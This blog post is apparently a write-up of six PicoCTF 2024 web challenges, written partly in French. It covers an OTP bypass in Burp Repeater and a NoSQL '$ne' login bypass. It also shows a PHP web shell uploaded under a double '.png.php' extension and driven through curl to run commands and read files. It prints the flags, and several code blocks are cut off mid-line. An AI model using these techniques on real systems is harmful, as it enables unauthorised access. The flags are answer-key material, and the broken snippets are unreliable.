---
image: "/assets/img/posts/picoctf_a8c4cbcb0e.png"
title: "Picoctf 2024"
description: "PicoCTF 2024 just ended a few days ago. For those unfamiliar, PicoCTF is a renowned Capture The Flag (CTF) platform, hosting a CTF every year. PicoCTF 2024 was a very rewarding CTF, offering exciting challenges in the field of IT security. C"
pubDate: "2024-03-27"
author: "MrR0807"
categories: ["CTF"]
tags: ["cybersecurity", "writeup"]
pin: false
---
In this post, I cover solving the 6/7 web challenges that were given during PicoCTF 2024. We will dive into each challenge to explore the techniques and strategies I used to solve them.





[The Best Academy to Learn Hacking](https://affiliate.hackthebox.com/nenandjabhata).[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1).


## Bookmarklet(50pts)





### Description:





Why search for the flag when I can make a bookmarklet to print it for me? Browse here, and find the flag!





### Solution





First I visit the site. [![b1](/assets/img/posts/b1_152dcb014e.png)](https://i.ibb.co/XXNTcnv/b1.png)





I find that I am given a javascript code which is the following:





  `








```bash


javascript:(function() {


            var encryptedFlag = "àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓÒËÉ§©í";


            var key = "picoctf";


            var decryptedFlag = "";


            for (var i = 0; i `





So what I will do is simply create a code.js file in my terminal, modify the line alert(decryptedFlag); to console.log, and execute it next. [![b2](/assets/img/posts/b2_0672d9a386.png)](https://i.ibb.co/8DZf9RL/b2.png)





  Show the Flag picoCTF{p@g3_turn3r_6bbf8953} 


## WebDecode(50pts)





### Description





Do you know how to use the web inspector? Start searching [here](http://titan.picoctf.net:54494/index.html) to find the flag.





### Solution





As always, I visit the target site that I need to inspect. [![w1](/assets/img/posts/w1_11d3470e0e.png)](https://i.ibb.co/zNgTgzs/w1.png) Looking at the site, I find 3 available pages, so I will visit the second page. [![w2](/assets/img/posts/w2_1126e13f2a.png)](https://i.ibb.co/wRFFnbv/w2.png) Here it tells me to inspect the page. When inspecting the source code, I find this interesting line:





  `











`





Ceci est un base64, en le decodant avec le Terminal Je recois mon Flag





  `











```bash


└─# echo cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMWY4MzI2MTV9 | base64 -d


picoCTF{web_succ3ssfully_d3c0ded_XXXXX}


```bash


`  Show the Flag picoCTF{web_succ3ssfully_d3c0ded_1f832615} 


## IntroToBurp(100pts)





### Description:





Try here to find the flag





### Solution





When visiting the target site, I find a registration page [![Registration](/assets/img/posts/Screenshot-2024-03-27-at-_093850dfcc.png)](https://i.ibb.co/g6tBn1p/Screenshot-2024-03-27-at-01-30-17-Registration.png) When I submit the form, the page redirects me to an OTP (One-Time Password) entry page. I do not know the PIN code, so I must bypass it.





To do this, I will intercept the traffic and send it to Burp Repeater [![Repeater](/assets/img/posts/o1_1bb1d34fff.png)](https://i.ibb.co/p4mrrBR/o1.png) I will delete the otp=123 line and resend the request next, [![Repeater 2](/assets/img/posts/o2_005784788a.png)](https://i.ibb.co/BsC8ny9/o2.png)  Show the Flag picoCTF{#0TP_Bypvss_SuCc3$S_6bffad21} 


## Unminify(100pts)





### Description:





I dont like scrolling down to read the code of my website, so Ive squished it. As a bonus, my pages load faster! Browse [here](http://titan.picoctf.net:55033/), and find the flag!





### Solution:





Here is le page du Site a exploiter [![Unminify](/assets/img/posts/Screenshot-2024-03-27-at-_a279e47801.png)](https://i.ibb.co/0JCDYLJ/Screenshot-2024-03-27-at-01-43-01-pico-CTF-pico-Gym-Unminify-Challenge.png) En inspectant le code Source du site je trouve le flag [![Flag](/assets/img/posts/u1_a014da797d.png)](https://i.ibb.co/NWd4Kp5/u1.png)





  Show the Flag picoCTF{pr3tty_c0d3_51d374f0} 


## NoSQL Injection(200pts)





### Descripion:





Can you try to get access to this website to get the flag? You can download the source [here](https://artifacts.picoctf.net/c_atlas/35/app.tar.gz). The website is running [here](http://atlas.picoctf.net:58727/). Can you log in?





### Solution:





In this challenge on est arrivé sur une page de Login. [![Login](/assets/img/posts/l1_51779aeed7.png)](https://i.ibb.co/mJndxPk/l1.png)





En telechargent aussi le code source du challenge je trouve deux fichiers interessants. Dans le /api/login je trouve le route.ts





  `











```bash


import User from "@/models/user";


import { connectToDB } from "@/utils/database";


import { seedUsers } from "@/utils/seed";





export const POST = async (req: any) => {


  const { email, password } = await req.json();


  try {


    await connectToDB();


    await seedUsers();


    const users = await User.find({


      email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,


      password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : p


    });





    if (users.length `





What I observed in this code is that:





> It searches for a user in the database by using the email and password provided. It converts emails and passwords that start and end with {} to JSON before using them in the search. If a matching user is found, it returns the user details as a response (200 OK). Otherwise, it returns a response indicating that the email or password is invalid (401 Invalid) or an internal server error (500 Internal Server Error) in the event of an error.





Next, in the /utils I find the seed.ts





  `








```bash


import User from "../models/user";





export const seedUsers = async (): Promise => {


  


  try {





     const users = await User.find({email: "joshiriya355@mumbama.com"});


      if (users.length > 0) {


        return;


      }


    const newUser = new User({


      firstName: "Josh",


      lastName: "Iriya",


      email: "joshiriya355@mumbama.com",


      password: process.env.NEXT_PUBLIC_PASSWORD as string


    });


    await newUser.save();


  } catch (error) {


    throw new Error("Some thing went wrong")


  }


};





```


`





To bypass this login of the user Josh Iriya with the email joshiriya355@mumbama.com, we can use the $ne Technique for this. I left some resources to see in [Additional Resources](#resources)





[![Bypassed](/assets/img/posts/l2_69a1c3c231.png)](https://i.ibb.co/XbKgBdQ/l2.png)





I have a good response of 200 with a base64 token that I will decode to get my flag





  Show The Flag picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_af67328d} 


## Trickster(300pts)





### Description:





I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:60160/)!





### Solution:





In this challenge, I found a file download system. [![File Upload](/assets/img/posts/Screenshot-2024-03-27-at-_3d9af7137c.png)](https://i.ibb.co/Mf7YfXS/Screenshot-2024-03-27-at-16-08-49-File-Upload-Page.png)





The first idea that comes to mind is that this site would be vulnerable to File Upload vulnerabilities. But I am told that I can only upload PNG files





By doing a Test of a .png file I receive. File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully And for a .php file I receive. Error: File name does not contain .png.





It seems to me that my file should just contain the .png, for example I can say file.png.php or file.png.png.php and that also works. Basically I'll just try ddisplay the page phpinfo [![phpinfo](/assets/img/posts/u1_79af234064.png)](https://i.ibb.co/cJjrnMD/u1.png)





In the response I am told that my file has been uploaded, but where? and so in the /robots.txt I find here.





  `








```bash


User-agent: *


Disallow: /instructions.txt


Disallow: /uploads/





```


`





[![phpinfo 2](/assets/img/posts/u2_85c339677d.png)](https://i.ibb.co/6wPtDTv/u2.png)





Okay, our code injects function, and we have the phpinfo file in return. Now, I'm going to replace the php code that I put with to have an RCE.





  `








```bash


└─# curl -s  "http://atlas.picoctf.net:60160/uploads/hacked.png.php?0=id" | strings 


uid=33(www-data) gid=33(www-data) groups=33(www-data)


└─# curl -s  "http://atlas.picoctf.net:60160/uploads/hacked.png.php?0=ls+/" | strings


boot


challenge


home


lib64


media


proc


root


sbin


└─# curl -s  "http://atlas.picoctf.net:55288/uploads/hacked.png.php?0=pwd" | strings


/var/www/html/uploads


└─# curl -s  "http://atlas.picoctf.net:55288/uploads/hacked.png.php?0=ls+-la+../" | strings


total 16


drwxrwxrwt 1 www-data www-data   21 Mar 11 23:59 .


drwxr-xr-x 1 root     root       18 Nov 21 14:01 ..


-rw-r--r-- 1 root     root       49 Mar 11 23:59 GNTDOMBWGIZDE.txt


-rw-r--r-- 1 root     root     1572 Feb  7 17:25 index.php


-rw-r--r-- 1 root     root      415 Feb  7 17:25 instructions.txt


-rw-r--r-- 1 root     root       62 Feb  7 17:25 robots.txt


drwxr-xr-x 1 www-data root       28 Mar 27 21:36 uploads





```


`





I find a file GNTDOMBWGIZDE.txt,





  `








```bash


─# curl -s  "http://atlas.picoctf.net:55288/uploads/hacked.png.php?0=cat+../GNTDOMBWGIZDE.txt" | strings


/* picoCTF{c3rt!fi3d_Xp3rt_XXXXXX} */





```


`  Show The Flag picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222} 


## Ressources supplementaires





Here are some additional resources that might be helpful to you:





[Utilisation de Burpsuite](https://www.softwaretestinghelp.com/how-to-use-burp-suite/)[Bypass Api Auth Using NoSQL Injection](https://danaepp.com/bypassing-api-auth-using-nosql-injection)[NodeJS & MongoDB NoSQL Injection](https://x3tb3t.github.io/2017/05/15/NodeJS-and-MongoDB-NoSQL-Injection/)[NoSQL Injection Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)[NoSql Injection Lab](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection)[Join Us on Discord](https://discord.gg/wBT9wr9ruG). Share        [](https://twitter.com/intent/tweet?text=PicoCTF%202024%20-%20Web%20Exploitation%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fpicoctf-2024%2F)       [](https://www.facebook.com/sharer/sharer.php?title=PicoCTF%202024%20-%20Web%20Exploitation%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&u=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fpicoctf-2024%2F)       [](https://t.me/share/url?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fpicoctf-2024%2F&text=PicoCTF%202024%20-%20Web%20Exploitation%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE)       [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fpicoctf-2024%2F)


